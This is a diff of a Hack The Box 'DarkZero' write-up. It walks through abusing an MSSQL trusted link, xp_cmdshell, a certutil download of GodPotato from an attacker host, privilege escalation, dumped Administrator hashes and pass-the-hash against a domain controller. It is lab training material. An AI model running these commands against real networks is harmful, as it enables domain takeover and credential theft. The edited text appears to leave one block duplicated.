@@ -4,13 +4,13 @@ title: "HTB - DarkZero"
 categories: [writeup]
 ---
 
-# Machine Info
+# Machine Information
 `DarkZero` is a hard-difficulty Windows machine designed around an assumed breach scenario in which the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment with Bidirectional trust, Cross-domain MSSQL Trusted Link, and `TGTDelegation`. The attacker discovers a misconfigured MSSQL trusted link, the link points to a different domain (`darkzero.htb` -> `darkzero.ext`), and the remote login has sysadmin privileges. The attacker enables the `xp_cmdshell` procedure as a sysadmin and executes commands. The spawned session under the `MSSQLSERVICE`, doesn't have `SeImpersonatePrivilege`; however, the user account running the service is configured and granted to have `SeServiceLogonRight`. The attacker is forced to change the password and get a new session with Logon Type 5 (Service Logon) to regain those privileges, and gain system privileges on the DC02 (`darkzero.ext`). To compromise the `darkzero.htb` domain, the attacker abuses `TGTdelegation` by forcing the DC01 to authenticate to DC02, having Unconstrained Delegation enabled.
 
-As is common in real life pentests, you will start the DarkZero box with credentials for the following account `john.w / RFulUtONCOL!`
+As is common in real life pentests, you will start the DarkZero box with credentials for the following account `john.w` / `RFulUtONCOL!`
 # Nmap Scan
 ### DC01.darkzero.htb
-```bash
+```
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-17 22:04:17Z)
@@ -81,7 +81,7 @@ Host script results:
 |_    Message signing enabled and required
 ```
 ### DC02.darkzero.ext
-```bash
+```
 PORT     STATE SERVICE       VERSION
 53/tcp   open  domain        Simple DNS Plus
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-17 22:53:41Z)
@@ -152,11 +152,9 @@ Host script results:
 |_nbstat: NetBIOS name: DC02, NetBIOS user: <unknown>, NetBIOS MAC: 00:15:5d:f2:5c:01 (Microsoft)
 ```
 # Initial Enumeration
-Authenticating to the MSSQL instance using the provided domain credentials via `impacket-mssqlclient`.
+Authenticating to the `MSSQL` instance using the provided domain credentials via `impacket-mssqlclient`.
 ```bash
 ~/HTB/Windows/DarkZero $ mssqlclient.py inlanefreight.local/john.w:'RFulUtONCOL!'@DC01 -windows-auth
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
-
 [*] Encryption required, switching to TLS
 [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
 [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
@@ -196,7 +194,7 @@ SQL (darkzero\john.w  guest@master)> use_link "DC02.darkzero.ext"
 SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)>
 ```
 # Initial Foothold
-Since `dc01_sql_svc` is `dbo`, we can enable `xp_cmdshell` to execute system commands and obtain an initial foothold on `DC02`. 
+Successfully leveraged `xp_cmdshell` to establish a foothold on `DC02`.
 ```bash
 SQL >"DC02.darkzero.ext" (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
 INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
@@ -281,7 +279,6 @@ Routing the target subnet through our tunnel interface.
 ```bash
 ~/HTB/Windows/DarkZero $ sudo ip route add 172.16.20.0/24 dev ligolo
 ```
-# Compromise darkzero.ext
 To further enumerate `DC02`, we require a valid domain account. Since we currently have an `MSSQL` session as `svc_sql` and `ADCS` is active on target, we can leverage the `Pass-the-Certificate` technique to retrieve the `NT` hash for `svc_sql`.
 Verified the `CA` details using `certutil`.
 ```bash
@@ -413,6 +410,7 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
+# Compromise darkzero.ext
 Leveraged `GodPotato` to abuse the impersonation privilege and add `svc_sql` to the local `Administrators` group.
 ```powershell
 C:\Users\Public>certutil -urlcache -f http://10.10.15.12/GodPotato-NET4.exe GodPotato-NET4.exe
@@ -455,7 +453,6 @@ SMB         172.16.20.2     445    DC02             [+] darkzero.ext\svc_sql:Pas
 SMB         172.16.20.2     445    DC02             [+] Executed command via wmiexec
 SMB         172.16.20.2     445    DC02             5b8a00d65a93b99d0bf39ce840c5190a
 ```
-# Compromise darkzero.htb
 Enumeration via `NetExec` confirmed that the `DC02$` computer account is `Trusted for Delegation (Unconstrained)`. This configuration allows us to intercept the `TGT` of any user who authenticates to `DC02`.
 ```bash
 ~/HTB/Windows/DarkZero $ nxc ldap DC02 -u svc_sql -p Password123 --trusted-for-delegation
@@ -463,6 +460,7 @@ LDAP        172.16.20.2     389    DC02             [*] Windows Server 2022 Buil
 LDAP        172.16.20.2     389    DC02             [+] darkzero.ext\svc_sql:Password123
 LDAP        172.16.20.2     389    DC02             DC02$
 ```
+# Compromise darkzero.htb
 Establish a `SYSTEM` shell on `DC02` using `impacket-psexec`.
 ```bash
 ~/HTB/Windows/DarkZero $ psexec.py darkzero.ext/svc_sql:Password123@DC02
@@ -533,6 +531,15 @@ Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f
 Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
 Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
 [*] Cleaning up...
+```
+Using the `Administrator`'s hash, I executed a `Pass-the-Hash` attack to retrieve the root flag.
+```bash
+~/HTB/Windows/DarkZero $ nxc smb DC01 -u Administrator -H 5917507bdf2ef2c2b0a869a1cba40726 -x "type C:\Users\Administrator\Desktop\root.txt"
+SMB         10.129.13.92    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.13.92    445    DC01             [+] darkzero.htb\Administrator:5917507bdf2ef2c2b0a869a1cba40726 (Pwn3d!)
+SMB         10.129.13.92    445    DC01             [+] Executed command via wmiexec
+SMB         10.129.13.92    445    DC01             70bba28ca33281cc5acba9a856ebd8a6
+```
 ```
 Using the `Administrator`'s hash, I executed a `Pass-the-Hash` attack to retrieve the root flag.
 ```bash
